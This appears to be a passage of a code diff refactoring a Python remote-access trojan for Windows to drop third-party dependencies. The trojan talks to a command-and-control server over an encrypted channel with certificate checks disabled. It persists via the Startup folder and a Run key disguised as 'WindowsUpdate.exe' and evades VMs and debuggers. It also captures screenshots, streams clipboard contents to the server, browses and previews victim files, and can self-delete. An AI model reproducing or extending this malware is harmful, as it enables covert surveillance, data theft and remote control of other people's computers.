@@ -8,33 +8,66 @@ import sys
 import time
 import platform
 import random
-import requests
+import struct
+import zlib
+import ssl
+import io
+import urllib.request
+import urllib.error
+import urllib.parse
 import winreg
-from dotenv import load_dotenv
-
-load_dotenv()
 import ctypes
 from shutil import copyfile
 
+
+# ============================================================
+#  Inline .env loader (replaces python-dotenv)
+# ============================================================
+def _load_dotenv(path=".env"):
+    """Parse .env file and inject into os.environ (only if key not already set)"""
+    try:
+        with open(path, "r") as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#") or "=" not in line:
+                    continue
+                key, _, val = line.partition("=")
+                key = key.strip()
+                val = val.strip()
+                # Strip surrounding quotes
+                if len(val) >= 2 and val[0] == val[-1] and val[0] in ('"', "'"):
+                    val = val[1:-1]
+                os.environ.setdefault(key, val)
+    except FileNotFoundError:
+        pass
+
+_load_dotenv()
+
+
+# ============================================================
+#  Configuration
+# ============================================================
 PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 PAYLOAD_NAME = "WindowsUpdate.exe"  # Renamed to look legitimate
 
-# === CONFIG ===
-C2_DOMAIN = os.getenv("C2_DOMAIN", "http://127.0.0.1:443").rstrip("/")  # Strip trailing slash to prevent double-slash URLs
+C2_DOMAIN = os.getenv("C2_DOMAIN", "http://127.0.0.1:443").rstrip("/")
 RETRY_DELAY = 30  # seconds
-RETRY_BACKOFF_MIN = 5   # minimum backoff when server is down
-RETRY_BACKOFF_MAX = 60  # maximum backoff when server is down
-POLLING_DELAY = 5  # Check for commands every N seconds
-JITTER = 2  # Random jitter +/- seconds added to polling
-CMD_TIMEOUT = 60  # Max seconds a shell command can run before being killed
-MUTEX_NAME = "Global\\WindowsUpdateMutex"  # Prevent multiple instances
-LOCK_FILE = os.path.join(os.getenv("TEMP", "."), ".wupdate.lock")  # Lockfile fallback
-XOR_KEY = 0x5A  # Simple XOR key for payload obfuscation
+RETRY_BACKOFF_MIN = 5
+RETRY_BACKOFF_MAX = 300  # Cap for exponential backoff when server is unreachable
+POLLING_DELAY = 1.0  # Responsive 1s command poll
+JITTER = 0.2  # +/- 0.2s jitter
+CMD_TIMEOUT = 60  # Max seconds a shell command can run
+MAX_RESULT_BYTES = 512 * 1024  # Cap on command output sent back to C2
+MAX_OUTBOX = 50  # Max results queued while delivery is failing
+MUTEX_NAME = "Global\\WindowsUpdateMutex"
+LOCK_FILE = os.path.join(os.getenv("TEMP", "."), ".wupdate.lock")
 ANTI_VM = False  # Set to False if you're testing in a VM
 DEBUG = False  # Set to True for console debug output
-# ================
 
-# === STEALTH: Realistic User-Agent Pool ===
+
+# ============================================================
+#  Stealth: Realistic User-Agent Pool
+# ============================================================
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
@@ -48,32 +81,26 @@ current_dir = os.getcwd()
 client_id = None  # Set after registration
 
 
-# === AES-256 + RSA Hybrid Encryption ===
+def get_username():
+    """Current user name — robust when no interactive session exists (scheduled task/service)"""
+    try:
+        import getpass
+        return getpass.getuser()
+    except Exception:
+        return os.environ.get("USERNAME", "unknown")
+
+
+# ============================================================
+#  AES-256 + RSA Hybrid Encryption
+# ============================================================
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
+from Crypto.Hash import SHA256
 from Crypto.Random import get_random_bytes
 
 aes_session_key = get_random_bytes(32)  # 256-bit AES key
 server_rsa_pub_key = None
 
-def fetch_server_rsa_pub():
-    """Fetch server RSA public key during startup handshake"""
-    global server_rsa_pub_key
-    try:
-        url = f"{C2_DOMAIN}/rsa_pub"
-        if DEBUG: print(f"[*] Fetching RSA public key from {url}...")
-        resp = requests.get(url, timeout=10)
-        if resp.status_code == 200 and resp.text.strip():
-            server_rsa_pub_key = RSA.import_key(resp.text)
-            if DEBUG: print("[+] RSA public key fetched successfully.")
-            return True
-        else:
-            print(f"[!] Failed to fetch RSA key. Status: {resp.status_code}")
-    except requests.exceptions.ConnectionError:
-        print(f"[!] Cannot connect to server at {C2_DOMAIN} — is server.py running?")
-    except Exception as e:
-        print(f"[!] Error fetching RSA key: {e}")
-    return False
 
 def encrypt_aes(data: str) -> str:
     """Encrypt string with AES-256-GCM"""
@@ -81,6 +108,7 @@ def encrypt_aes(data: str) -> str:
     ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf-8'))
     payload = cipher.nonce + tag + ciphertext
     return base64.b64encode(payload).decode()
+
 
 def decrypt_aes(raw_b64: str) -> str:
     """Decrypt base64 encoded AES-256-GCM payload"""
@@ -93,41 +121,136 @@ def decrypt_aes(raw_b64: str) -> str:
     return decrypted.decode('utf-8')
 
 
-# === Encrypted C2 Communication Helpers ===
-_http_session = None
+# ============================================================
+#  HTTP helpers (replaces requests — pure stdlib)
+# ============================================================
+_ssl_ctx = ssl.create_default_context()
+_ssl_ctx.check_hostname = False
+_ssl_ctx.verify_mode = ssl.CERT_NONE
 
-def get_session():
-    global _http_session
-    if _http_session is None:
-        _http_session = requests.Session()
-        _http_session.headers.update({
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept-Encoding": "gzip, deflate",
-        })
-    return _http_session
+_current_ua = None
+
+
+def _get_ua():
+    global _current_ua
+    if _current_ua is None:
+        _current_ua = random.choice(USER_AGENTS)
+    return _current_ua
+
+
+def _default_headers():
+    return {
+        "User-Agent": _get_ua(),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+    }
+
+
+class _HttpResponse:
+    """Minimal response object matching the interface used by C2 functions"""
+    __slots__ = ("_body", "status_code")
+
+    def __init__(self, body: bytes, status_code: int):
+        self._body = body
+        self.status_code = status_code
+
+    @property
+    def text(self):
+        return self._body.decode("utf-8", errors="replace")
+
+    @property
+    def content(self):
+        return self._body
+
+
+def _http_get(url, params=None, timeout=10):
+    """HTTP GET → _HttpResponse.  Raises ConnectionError on network failure."""
+    if params:
+        url = url + "?" + urllib.parse.urlencode(params)
+    req = urllib.request.Request(url, headers=_default_headers())
+    try:
+        resp = urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx)
+        return _HttpResponse(resp.read(), resp.status)
+    except urllib.error.HTTPError as e:
+        body = b""
+        try:
+            body = e.read()
+        except Exception:
+            pass
+        return _HttpResponse(body, e.code)
+    except (urllib.error.URLError, socket.timeout, OSError) as e:
+        raise ConnectionError(str(e))
+
+
+def _http_post(url, data, headers=None, params=None, timeout=10):
+    """HTTP POST → _HttpResponse.  Raises ConnectionError on network failure."""
+    if params:
+        url = url + "?" + urllib.parse.urlencode(params)
+    hdrs = _default_headers()
+    if headers:
+        hdrs.update(headers)
+    if isinstance(data, str):
+        data = data.encode("utf-8")
+    req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
+    try:
+        resp = urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx)
+        return _HttpResponse(resp.read(), resp.status)
+    except urllib.error.HTTPError as e:
+        body = b""
+        try:
+            body = e.read()
+        except Exception:
+            pass
+        return _HttpResponse(body, e.code)
+    except (urllib.error.URLError, socket.timeout, OSError) as e:
+        raise ConnectionError(str(e))
+
+
+# ============================================================
+#  Encrypted C2 Communication
+# ============================================================
+def fetch_server_rsa_pub():
+    """Fetch server RSA public key during startup handshake"""
+    global server_rsa_pub_key
+    try:
+        url = f"{C2_DOMAIN}/rsa_pub"
+        if DEBUG: print(f"[*] Fetching RSA public key from {url}...")
+        resp = _http_get(url, timeout=10)
+        if resp.status_code == 200 and resp.text.strip():
+            server_rsa_pub_key = RSA.import_key(resp.text)
+            if DEBUG: print("[+] RSA public key fetched successfully.")
+            return True
+        else:
+            print(f"[!] Failed to fetch RSA key. Status: {resp.status_code}")
+    except ConnectionError:
+        print(f"[!] Cannot connect to server at {C2_DOMAIN} — is server.py running?")
+    except Exception as e:
+        print(f"[!] Error fetching RSA key: {e}")
+    return False
+
 
 def c2_post(endpoint, data, timeout=10):
-    """Send AES-encrypted POST (with RSA-encrypted session key for registration or direct AES for subsequent requests)"""
+    """Send AES-encrypted POST (with RSA-encrypted session key for /register)"""
     if DEBUG: print(f"[*] Sending POST to {endpoint}...")
-    global server_rsa_pub_key
+    global server_rsa_pub_key, aes_session_key
     json_data = json.dumps(data)
-    
+
     if endpoint.strip("/") == "register":
-        if not server_rsa_pub_key:
-            fetch_server_rsa_pub()
-        
+        # Always re-fetch RSA key and regenerate AES session key before registration
+        # — the server may have restarted with a new RSA key pair
+        aes_session_key = get_random_bytes(32)
+        fetch_server_rsa_pub()
+
         if server_rsa_pub_key:
-            rsa_cipher = PKCS1_OAEP.new(server_rsa_pub_key)
+            rsa_cipher = PKCS1_OAEP.new(server_rsa_pub_key, hashAlgo=SHA256)
             enc_session_key = base64.b64encode(rsa_cipher.encrypt(aes_session_key)).decode()
             encrypted_payload = encrypt_aes(json_data)
-            
+
             hybrid_packet = {
                 "encrypted_session_key": enc_session_key,
                 "payload": encrypted_payload
             }
-            resp = get_session().post(
+            resp = _http_post(
                 f"{C2_DOMAIN}{endpoint}",
                 data=json.dumps(hybrid_packet),
                 headers={"Content-Type": "application/json"},
@@ -137,13 +260,13 @@ def c2_post(endpoint, data, timeout=10):
             if resp.status_code != 200:
                 if DEBUG: print(f"[!] Server Error Detail: {resp.text}")
             return resp
-            
-    # Standard AES-encrypted request — pass client_id as query param for server lookup
+
+    # Standard AES-encrypted request
     encrypted = encrypt_aes(json_data)
     params = {}
     if client_id:
         params["id"] = client_id
-    resp = get_session().post(
+    resp = _http_post(
         f"{C2_DOMAIN}{endpoint}",
         data=encrypted,
         headers={"Content-Type": "application/octet-stream"},
@@ -155,27 +278,60 @@ def c2_post(endpoint, data, timeout=10):
         if DEBUG: print(f"[!] Server Error Detail: {resp.text}")
     return resp
 
+
 def c2_get(endpoint, params=None, timeout=10):
-    """Send GET to C2 and decrypt AES response. Falls back to plain JSON if server has no session key (e.g. after restart)."""
+    """GET from C2 and decrypt AES response. Never accepts plaintext.
+    Any non-200 (e.g. 401 from a restarted server that lost our session)
+    is surfaced as a re-register signal."""
     if DEBUG: print(f"[*] Polling {endpoint}...")
-    resp = get_session().get(f"{C2_DOMAIN}{endpoint}", params=params, timeout=timeout)
-    if resp.status_code == 200 and resp.text.strip():
+    resp = _http_get(f"{C2_DOMAIN}{endpoint}", params=params, timeout=timeout)
+    if resp.status_code != 200:
+        return {"action": "re-register"}
+    if resp.text.strip():
         try:
-            decrypted = decrypt_aes(resp.text)
-            return json.loads(decrypted)
+            return json.loads(decrypt_aes(resp.text))
         except Exception:
-            pass
-        # Fallback: server may have restarted without our session key
-        try:
-            data = json.loads(resp.text)
-            if isinstance(data, dict):
-                return data
-        except Exception:
-            pass
+            return None
     return None
 
 
-# === STEALTH: Anti-VM / Sandbox Detection ===
+# ============================================================
+#  Result Outbox — reliable result delivery
+# ============================================================
+_result_outbox = []
+_outbox_lock = threading.Lock()
+
+
+def send_result(payload):
+    """Queue a result for delivery to C2; retried automatically on later polls.
+    Deliberately in-memory only — result data is never written to disk."""
+    with _outbox_lock:
+        _result_outbox.append(payload)
+        if len(_result_outbox) > MAX_OUTBOX:
+            del _result_outbox[:len(_result_outbox) - MAX_OUTBOX]
+
+
+def flush_outbox():
+    """Deliver queued results oldest-first. Stops at the first failure and
+    leaves the undelivered remainder queued for the next poll cycle."""
+    while True:
+        with _outbox_lock:
+            if not _result_outbox:
+                return True
+            item = _result_outbox[0]
+        try:
+            resp = c2_post("/result", item)
+            if resp.status_code != 200:
+                return False
+        except Exception:
+            return False
+        with _outbox_lock:
+            _result_outbox.pop(0)
+
+
+# ============================================================
+#  Anti-VM / Sandbox Detection
+# ============================================================
 def is_vm_or_sandbox():
     """Detect if running inside a VM, sandbox, or analysis environment"""
     indicators = 0
@@ -261,17 +417,17 @@ def is_vm_or_sandbox():
     return indicators >= 3
 
 
-# === STEALTH: Anti-Debug Detection ===
+# ============================================================
+#  Anti-Debug Detection
+# ============================================================
 def is_debugger_present():
     """Detect if a debugger or analysis tool is attached"""
-    # Check Windows IsDebuggerPresent API
     try:
         if ctypes.windll.kernel32.IsDebuggerPresent():
             return True
     except Exception:
         pass
 
-    # Check for common analysis tools running
     try:
         output = subprocess.check_output(
             "tasklist /FO CSV /NH", shell=True,
@@ -294,9 +450,11 @@ def is_debugger_present():
     return False
 
 
-# === STEALTH: Hide Console Window ===
+# ============================================================
+#  Console Hiding
+# ============================================================
 def hide_console():
-    """Hide the console window (fallback if --noconsole isn't working)"""
+    """Hide the console window"""
     try:
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if hwnd:
@@ -305,7 +463,9 @@ def hide_console():
         pass
 
 
-# Global handle — must persist for the lifetime of the process
+# ============================================================
+#  Single Instance Guard
+# ============================================================
 _mutex_handle = None
 _lock_fh = None
 
@@ -323,21 +483,17 @@ def check_single_instance():
     except Exception:
         pass
 
-    # Method 2: Lockfile (fallback if mutex somehow fails)
+    # Method 2: Lockfile fallback
     try:
         if os.path.exists(LOCK_FILE):
-            # Check if the PID in the lockfile is still alive
             with open(LOCK_FILE, "r") as f:
                 old_pid = int(f.read().strip())
-            # Check if process with that PID exists
             try:
-                os.kill(old_pid, 0)  # Signal 0 = just check existence
-                # Process is alive → another instance is running
+                os.kill(old_pid, 0)
                 sys.exit(0)
             except (OSError, ProcessLookupError):
-                pass  # Process is dead, stale lock — we can proceed
+                pass
 
-        # Write our PID
         _lock_fh = open(LOCK_FILE, "w")
         _lock_fh.write(str(os.getpid()))
         _lock_fh.flush()
@@ -345,15 +501,16 @@ def check_single_instance():
         pass
 
 
+# ============================================================
+#  Persistence
+# ============================================================
 def add_persistence():
     """Add persistence via Startup folder + Registry Run key"""
     try:
-        # Method 1: Startup folder
         payload_path = os.path.join(PERSISTENCE_PATH, PAYLOAD_NAME)
         if not os.path.exists(payload_path):
             copyfile(sys.executable, payload_path)
 
-        # Method 2: Registry Run key (points to same path for now)
         try:
             regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
             winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, payload_path)
@@ -367,14 +524,12 @@ def add_persistence():
 def remove_persistence():
     """Remove all persistence mechanisms"""
     try:
-        # Remove from Startup folder
         payload_path = os.path.join(PERSISTENCE_PATH, PAYLOAD_NAME)
         if os.path.exists(payload_path):
             os.remove(payload_path)
     except Exception:
         pass
     try:
-        # Remove registry key
         regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
         winreg.DeleteValue(regkey, "WindowsUpdate")
         winreg.CloseKey(regkey)
@@ -390,18 +545,19 @@ def disable_defender():
         pass
 
 
+# ============================================================
+#  Process List
+# ============================================================
 def get_process_list():
     """Get list of running processes as JSON string"""
     try:
-        # Using tasklist /FO CSV /V for detailed info including User and Window Title
+        import csv
+
         output = subprocess.check_output(
-            "tasklist /FO CSV /V", shell=True, 
+            "tasklist /FO CSV /V", shell=True,
             stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
         ).decode(errors='replace')
-        
-        import csv
-        import io
-        
+
         f = io.StringIO(output)
         reader = csv.DictReader(f)
         processes = []
@@ -414,12 +570,15 @@ def get_process_list():
                 "cpu": row.get("CPU Time", ""),
                 "title": row.get("Window Title", "")
             })
-        
+
         return "[JSON_PROCS]" + json.dumps(processes)
     except Exception as e:
         return f"[-] Error gathering processes: {str(e)}"
 
 
+# ============================================================
+#  System Info
+# ============================================================
 def get_system_info():
     """Gather detailed system information"""
     try:
@@ -428,18 +587,16 @@ def get_system_info():
         info_lines.append(f"OS          : {platform.system()} {platform.release()} ({platform.version()})")
         info_lines.append(f"Architecture: {platform.machine()}")
         info_lines.append(f"Processor   : {platform.processor()}")
-        info_lines.append(f"Username    : {os.getlogin()}")
+        info_lines.append(f"Username    : {get_username()}")
         info_lines.append(f"PID         : {os.getpid()}")
         info_lines.append(f"CWD         : {current_dir}")
 
-        # Check admin privileges
         try:
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             info_lines.append(f"Admin       : {'Yes' if is_admin else 'No'}")
         except Exception:
             info_lines.append(f"Admin       : Unknown")
 
-        # Network interfaces
         try:
             result = subprocess.check_output("ipconfig", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
             info_lines.append(f"\n--- Network ---\n{result.decode('utf-8', errors='replace')}")
@@ -451,28 +608,144 @@ def get_system_info():
         return f"[-] Error gathering sysinfo: {str(e)}"
 
 
+# ============================================================
+#  Screenshot — Pure GDI + stdlib PNG  (replaces mss + Pillow)
+# ============================================================
+
+# Set up GDI ctypes signatures for 64-bit safety
+_user32 = ctypes.windll.user32
+_gdi32 = ctypes.windll.gdi32
+
+_user32.GetDC.argtypes = [ctypes.c_void_p]
+_user32.GetDC.restype = ctypes.c_void_p
+_user32.ReleaseDC.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
+_user32.ReleaseDC.restype = ctypes.c_int
+_user32.GetSystemMetrics.argtypes = [ctypes.c_int]
+_user32.GetSystemMetrics.restype = ctypes.c_int
+
+_gdi32.CreateCompatibleDC.argtypes = [ctypes.c_void_p]
+_gdi32.CreateCompatibleDC.restype = ctypes.c_void_p
+_gdi32.CreateCompatibleBitmap.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
+_gdi32.CreateCompatibleBitmap.restype = ctypes.c_void_p
+_gdi32.SelectObject.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
+_gdi32.SelectObject.restype = ctypes.c_void_p
+_gdi32.BitBlt.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int,
+                           ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_uint32]
+_gdi32.BitBlt.restype = ctypes.c_bool
+_gdi32.GetDIBits.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint,
+                              ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint]
+_gdi32.GetDIBits.restype = ctypes.c_int
+_gdi32.DeleteObject.argtypes = [ctypes.c_void_p]
+_gdi32.DeleteObject.restype = ctypes.c_bool
+_gdi32.DeleteDC.argtypes = [ctypes.c_void_p]
+_gdi32.DeleteDC.restype = ctypes.c_bool
+
+
+class _BITMAPINFOHEADER(ctypes.Structure):
+    _fields_ = [
+        ('biSize', ctypes.c_uint32),
+        ('biWidth', ctypes.c_int32),
+        ('biHeight', ctypes.c_int32),
+        ('biPlanes', ctypes.c_uint16),
+        ('biBitCount', ctypes.c_uint16),
+        ('biCompression', ctypes.c_uint32),
+        ('biSizeImage', ctypes.c_uint32),
+        ('biXPelsPerMeter', ctypes.c_int32),
+        ('biYPelsPerMeter', ctypes.c_int32),
+        ('biClrUsed', ctypes.c_uint32),
+        ('biClrImportant', ctypes.c_uint32),
+    ]
+
+
+def _create_png_from_bgra(width, height, bgra_data, stride):
+    """Create a PNG file from raw BGRA pixel buffer using only stdlib (struct + zlib)"""
+
+    def _png_chunk(chunk_type, data):
+        raw = chunk_type + data
+        crc = zlib.crc32(raw) & 0xffffffff
+        return struct.pack('>I', len(data)) + raw + struct.pack('>I', crc)
+
+    # Pre-allocate: each row = 1 filter byte + width * 3 RGB bytes
+    row_len = 1 + width * 3
+    raw = bytearray(row_len * height)
+
+    for y in range(height):
+        out_row = y * row_len
+        raw[out_row] = 0  # PNG row filter: None
+        in_row = y * stride
+        out_px = out_row + 1
+        for x in range(width):
+            src = in_row + x * 4
+            raw[out_px]     = bgra_data[src + 2]  # R
+            raw[out_px + 1] = bgra_data[src + 1]  # G
+            raw[out_px + 2] = bgra_data[src]      # B
+            out_px += 3
+
+    ihdr = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
+    idat = zlib.compress(bytes(raw), 6)
+
+    return (b'\x89PNG\r\n\x1a\n' +
+            _png_chunk(b'IHDR', ihdr) +
+            _png_chunk(b'IDAT', idat) +
+            _png_chunk(b'IEND', b''))
+
+
 def take_screenshot():
-    """Capture screenshot and return base64 encoded PNG"""
+    """Capture screenshot using Windows GDI and return base64 encoded PNG"""
     try:
-        import mss
-        import mss.tools
-        with mss.mss() as sct:
-            monitor = sct.monitors[0]  # Entire screen
-            screenshot = sct.grab(monitor)
-            # Convert to PNG bytes
-            png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
-            return base64.b64encode(png_bytes).decode()
-    except ImportError:
-        return "[-] mss module not available. Install with: pip install mss"
+        # Virtual screen (all monitors)
+        left   = _user32.GetSystemMetrics(76)  # SM_XVIRTUALSCREEN
+        top    = _user32.GetSystemMetrics(77)  # SM_YVIRTUALSCREEN
+        width  = _user32.GetSystemMetrics(78)  # SM_CXVIRTUALSCREEN
+        height = _user32.GetSystemMetrics(79)  # SM_CYVIRTUALSCREEN
+
+        if width <= 0 or height <= 0:
+            # Fallback to primary monitor
+            width  = _user32.GetSystemMetrics(0)
+            height = _user32.GetSystemMetrics(1)
+            left = top = 0
+
+        hdc_screen = _user32.GetDC(None)
+        hdc_mem = _gdi32.CreateCompatibleDC(hdc_screen)
+        hbmp = _gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
+
+        old_obj = _gdi32.SelectObject(hdc_mem, hbmp)
+        _gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, left, top, 0x00CC0020)  # SRCCOPY
+        _gdi32.SelectObject(hdc_mem, old_obj)
+
+        # Read pixel data
+        bmi = _BITMAPINFOHEADER()
+        bmi.biSize = ctypes.sizeof(_BITMAPINFOHEADER)
+        bmi.biWidth = width
+        bmi.biHeight = -height  # Top-down DIB
+        bmi.biPlanes = 1
+        bmi.biBitCount = 32     # BGRA
+        bmi.biCompression = 0   # BI_RGB
+
+        buf_size = width * height * 4
+        buf = ctypes.create_string_buffer(buf_size)
+        _gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buf, ctypes.byref(bmi), 0)
+
+        # Cleanup GDI
+        _gdi32.DeleteObject(hbmp)
+        _gdi32.DeleteDC(hdc_mem)
+        _user32.ReleaseDC(None, hdc_screen)
+
+        # Convert BGRA → PNG
+        png_bytes = _create_png_from_bgra(width, height, buf.raw, width * 4)
+        return base64.b64encode(png_bytes).decode()
+
     except Exception as e:
         return f"[-] Screenshot error: {str(e)}"
 
 
+# ============================================================
+#  Self-Destruct
+# ============================================================
 def self_destruct():
     """Remove persistence, delete executable, and exit"""
     remove_persistence()
     try:
-        # Schedule self-deletion via cmd after a short delay
         exe_path = sys.executable
         subprocess.Popen(
             f'cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q "{exe_path}"',
@@ -483,7 +756,9 @@ def self_destruct():
     os._exit(0)
 
 
-# === Clipboard Functions ===
+# ============================================================
+#  Clipboard Functions
+# ============================================================
 _clipboard_monitor_active = False
 _clipboard_thread = None
 _last_clipboard = ""
@@ -506,8 +781,7 @@ def get_clipboard():
         if not ctypes.windll.user32.OpenClipboard(None):
             return "[-] Clipboard is locked by another app"
         try:
-            # CF_UNICODETEXT = 13
-            handle = ctypes.windll.user32.GetClipboardData(13)
+            handle = ctypes.windll.user32.GetClipboardData(13)  # CF_UNICODETEXT
             if not handle:
                 return "[-] Clipboard has no text data"
             ptr = ctypes.windll.kernel32.GlobalLock(handle)
@@ -554,13 +828,11 @@ def _clipboard_monitor_loop():
 
             if current and current != _last_clipboard:
                 _last_clipboard = current
-                try:
-                    c2_post("/result", {
-                        "output": f"[📋 CLIPBOARD] {current}",
-                        "client_id": client_id
-                    })
-                except Exception:
-                    pass
+                send_result({
+                    "output": f"[📋 CLIPBOARD] {current}",
+                    "client_id": client_id
+                })
+                flush_outbox()
 
         except Exception:
             pass
@@ -584,8 +856,11 @@ def stop_clipboard_monitor():
     _clipboard_monitor_active = False
 
 
-# === File Browser ===
-MAX_FILE_LIST_ITEMS = 500  # Cap to prevent massive payloads
+# ============================================================
+#  File Browser
+# ============================================================
+MAX_FILE_LIST_ITEMS = 500
+
 
 def _format_size(size):
     """Format byte size to human readable string"""
@@ -597,6 +872,7 @@ def _format_size(size):
         return f"{size / (1024*1024):.1f} MB"
     else:
         return f"{size / (1024*1024*1024):.2f} GB"
+
 
 def resolve_special_folder(folder_type):
     """Resolve Windows special folders dynamically via Registry (handles OneDrive redirection)"""
@@ -612,8 +888,7 @@ def resolve_special_folder(folder_type):
         'favorites': 'Favorites',
         'appdata': 'AppData',
     }
-    
-    # 1. Try Windows Registry (handles OneDrive Known Folder Move / redirection)
+
     if folder_type in reg_map:
         try:
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders') as key:
@@ -624,7 +899,6 @@ def resolve_special_folder(folder_type):
         except Exception:
             pass
 
-    # 2. Fallbacks with OneDrive checks
     onedrive_base = os.environ.get('OneDrive', os.path.join(home, 'OneDrive'))
     fallbacks = {
         'desktop': [os.path.join(home, 'Desktop'), os.path.join(onedrive_base, 'Desktop')],
@@ -641,7 +915,7 @@ def resolve_special_folder(folder_type):
         'onedrive': [onedrive_base, os.path.join(home, 'OneDrive')],
         'appdata': [os.environ.get('APPDATA', os.path.join(home, 'AppData', 'Roaming'))]
     }
-    
+
     candidates = fallbacks.get(folder_type, [])
     for c in candidates:
         if os.path.isdir(c):
@@ -653,18 +927,22 @@ def browse_files(path=""):
     """List files and directories with details — returns JSON for fast frontend parsing"""
     global current_dir
     try:
-        # Clean the path thoroughly
         clean_path = path.strip().strip('"').strip("'") if path else ""
 
         # Special case: Resolve well-known folders dynamically
         if clean_path.startswith("SPECIAL:"):
-            folder_type = clean_path.split(":", 1)[1].lower()
-            clean_path = resolve_special_folder(folder_type)
+            raw = clean_path.split(":", 1)[1]
+            parts = raw.replace("\\", "/").split("/", 1)
+            folder_type = parts[0].lower()
+            base_folder = resolve_special_folder(folder_type)
+            if len(parts) > 1 and parts[1].strip():
+                clean_path = os.path.join(base_folder, parts[1].replace("/", os.sep))
+            else:
+                clean_path = base_folder
 
-        # Clean again for drive check
         upper_path = clean_path.upper()
 
-        # Special case: list drives — return JSON format
+        # Special case: list drives
         if upper_path == "DRIVES":
             drives = []
             bitmask = ctypes.windll.kernel32.GetLogicalDrives()
@@ -685,30 +963,24 @@ def browse_files(path=""):
             }
             return "[JSON_FILES]" + json.dumps(result)
 
-        # Handle path resolution
         target_path = clean_path if clean_path else current_dir
-        
-        # If it's a relative path, join with current_dir
+
         if not os.path.isabs(target_path) and not (len(target_path) >= 2 and target_path[1] == ':'):
             target_path = os.path.join(current_dir, target_path)
-        
+
         target_path = os.path.abspath(target_path)
 
         if not os.path.isdir(target_path):
             return f"[-] Not a directory: {target_path}"
 
-        # Auto-update current_dir so downloads and relative paths work
         current_dir = target_path
 
         dirs_list = []
         files_list = []
         try:
-            # os.scandir() is 2-10x faster than os.listdir() + os.stat()
-            # It caches stat info from the directory read itself
             with os.scandir(target_path) as scanner:
                 for entry in scanner:
                     try:
-                        # entry.is_dir() and entry.stat() use cached OS data — no extra syscalls
                         is_dir = entry.is_dir(follow_symlinks=False)
                         try:
                             stat = entry.stat(follow_symlinks=False)
@@ -738,7 +1010,6 @@ def browse_files(path=""):
         except PermissionError:
             return f"[-] Permission denied: {target_path}"
 
-        # Sort: directories first (alphabetical), then files (alphabetical)
         dirs_list.sort(key=lambda x: x["name"].lower())
         files_list.sort(key=lambda x: x["name"].lower())
         all_items = dirs_list + files_list
@@ -760,14 +1031,11 @@ def browse_files(path=""):
         return f"[-] Browse error: {str(e)}"
 
 
-import io
-try:
-    from PIL import Image
-except ImportError:
-    Image = None
-
+# ============================================================
+#  File Preview  (no PIL — raw read only)
+# ============================================================
 def preview_file(path):
-    """Generate instant image or text preview payload for remote files"""
+    """Generate file preview payload for remote files (no Pillow dependency)"""
     global current_dir
     try:
         clean_path = path.strip().strip('"').strip("'") if path else ""
@@ -802,36 +1070,17 @@ def preview_file(path):
             '.h', '.hpp', '.rs', '.go', '.java'
         }
 
-        # 1. Image Preview
+        # 1. Image Preview — raw read (no resizing without PIL, but cap at 10 MB)
         if ext in img_exts:
-            if Image is not None:
-                try:
-                    with Image.open(target_path) as img:
-                        # Downscale only if extremely large to save bandwidth while keeping crisp preview
-                        max_dim = 1600
-                        if img.width > max_dim or img.height > max_dim:
-                            img.thumbnail((max_dim, max_dim), Image.Resampling.LANCZOS)
-                        
-                        buf = io.BytesIO()
-                        fmt = 'JPEG' if ext in ['.jpg', '.jpeg'] else 'PNG'
-                        if fmt == 'JPEG' and img.mode in ('RGBA', 'LA', 'P'):
-                            img = img.convert('RGB')
-                        img.save(buf, format=fmt, quality=90)
-                        b64_data = base64.b64encode(buf.getvalue()).decode('utf-8')
-                        mime = 'image/jpeg' if fmt == 'JPEG' else 'image/png'
-                        return "[JSON_PREVIEW]" + json.dumps({
-                            "status": "ok",
-                            "type": "image",
-                            "name": os.path.basename(target_path),
-                            "path": target_path,
-                            "mime": mime,
-                            "data": b64_data,
-                            "size": size_str
-                        })
-                except Exception:
-                    pass
-
-            # Fallback to direct raw read for images
+            if size > 10 * 1024 * 1024:
+                return "[JSON_PREVIEW]" + json.dumps({
+                    "status": "unsupported",
+                    "type": "image",
